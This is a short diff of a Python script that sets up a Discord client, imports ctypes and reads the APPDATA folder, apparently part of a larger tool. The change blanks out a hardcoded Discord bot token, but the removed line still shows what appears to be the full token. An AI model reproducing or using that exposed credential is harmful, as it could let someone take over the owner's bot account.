@@ -17,7 +17,7 @@ from ctypes import *
 import asyncio
 import discord
 from discord import utils
-token = 'ODI5MTE1NjA4NjQ5MDM5OTAz.YGzcFQ.qMe6XV1wCyMczV92QA8rQrZEyvQ'
+token = ''
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
